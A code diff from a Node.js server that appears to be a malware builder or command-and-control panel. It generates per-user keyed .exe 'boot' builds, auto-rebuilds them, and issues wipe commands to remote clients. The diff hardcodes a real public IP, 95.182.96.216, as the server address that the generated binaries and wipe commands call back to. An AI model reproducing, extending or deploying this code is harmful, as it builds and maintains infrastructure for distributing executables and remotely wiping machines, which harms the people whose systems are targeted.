@@ -587,9 +587,8 @@ app.post('/api/clients/:id/wipe', requireAuth, async (req, res) => {
 
   let base = req.body?.serverBase;
   if (!base) {
-    // FORCE THE PUBLIC IP INSTEAD OF localhost
-    const host = process.env.SERVER_IP || req.headers.host.split(':')[0];
-    base = `http://${host}`;
+    // HARDCODED IP
+    base = 'http://95.182.96.216';
   }
 
   const line = buildWipeCommand(base);
@@ -860,9 +859,8 @@ app.post('/api/build', requireAuth, limitBuild, async (req, res) => {
     const nextIdRow = db.prepare(sql`SELECT MAX(id) + 1 AS nextId FROM builds`).get();
     const nextBuildId = nextIdRow && nextIdRow.nextId ? nextIdRow.nextId : 1;
     
-    // FORCE THE PUBLIC IP INSTEAD OF localhost
-    const host = process.env.SERVER_IP || req.headers.host.split(':')[0];
-    const serverBase = `http://${host}`;
+    // HARDCODED IP
+    const serverBase = `http://95.182.96.216`;
 
     zipBuf = await buildBoot({ key: buildKey, buildId: nextBuildId, serverIp: serverBase });
   } catch (e) {
@@ -1096,8 +1094,8 @@ async function refreshAllBuilds() {
 
         console.log(`[auto-refresh] user ${uid} build ${latest.id}...`);
         
-        const host = process.env.SERVER_IP || 'localhost';
-        const serverBase = `http://${host}`;
+        // HARDCODED IP
+        const serverBase = `http://95.182.96.216`;
         
         const exeBuf = await buildBoot({ key: latest.key || u.account_key, buildId: latest.id, serverIp: serverBase });
         const exeName = `build_${Date.now()}_u${uid}.exe`;
